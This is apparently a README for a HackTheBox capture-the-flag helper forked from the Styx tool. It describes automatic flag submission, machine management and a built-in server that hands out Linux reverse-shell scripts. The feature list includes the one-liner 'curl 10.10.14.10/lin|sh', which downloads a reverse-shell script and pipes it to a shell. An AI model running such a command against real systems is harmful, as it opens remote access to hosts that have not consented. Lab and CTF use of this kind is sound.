
# buster
 Buster is a utility for the Dombusters team to use for HackTheBox. It draws heavy inspiration, and is built based on [Celesian's Styx tool](https://github.com/c3l3si4n/styx)   
  
 ## Purpose
 Buster was built for the sole purpose of levelling the playing field during HTB seasons. With the speed at which the usual few complete easy machines, we need to save seconds where ever we can.
 To save reinventing the wheel, Celesian's tool was cloned and modified to better suit our use cases.

 ## Features
 #### **Automatic Flag Submission** 
 Styx will continuously check the machine clipboard for any user or root flags, and will submit them automatically through HackTheBox's APIs. 
 #### **Built-in Reverse Shell Generator** 
 Styx contains a simple HTTP server that listens on port :61337 and returns pre-made reverse-shell scripts for Linux. Allowing you to quickly get a reverse shell with a simple  `curl 10.10.14.10/lin|sh` 
 #### **Machine Management** 
 Styx allows the user to start and stop machines on their own behalf. Flag submission is handled by the **auto flag submission** feature. 

## Usage
1. `sudo apt install -y libxcursor-dev libxrandr-dev libxinerama-dev libxi-dev libxxf86vm-dev`
2. `go install github.com/c3l3si4n/styx@HEAD`
3. Create an app token on your HTB profile (any duration you want)
4. Set the `HTB_TOKEN` environment variable with the value containing your generated token
5. Run styx

